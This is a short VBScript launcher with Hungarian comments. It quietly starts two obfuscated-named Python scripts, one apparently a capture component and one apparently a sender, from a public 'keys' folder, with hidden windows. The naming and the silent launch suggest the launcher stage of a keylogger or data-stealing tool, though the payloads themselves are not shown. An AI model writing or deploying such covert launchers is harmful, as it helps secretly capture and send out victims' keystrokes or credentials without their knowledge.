Option Explicit

Dim shell, pythonExe, baseDir, spwPath, sendPath, fso

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Python exe (ha máshol van, írd meg!)
pythonExe = "C:\Python311\python.exe"

' A folder ahol a két py van
baseDir = "C:\Users\Public\Documents\keys"

spwPath = baseDir & "\spwww743g7w.py"
sendPath = baseDir & "\fwsendbfgw.py"

If Not fso.FileExists(pythonExe) Then
    MsgBox "Python exe not found: " & pythonExe
    WScript.Quit
End If

If Not fso.FileExists(spwPath) Then
    MsgBox "spw.py not found: " & spwPath
    WScript.Quit
End If

If Not fso.FileExists(sendPath) Then
    MsgBox "send.py not found: " & sendPath
    WScript.Quit
End If

shell.Run """" & pythonExe & """ """ & spwPath & """", 0, False
shell.Run """" & pythonExe & """ """ & sendPath & """", 0, False
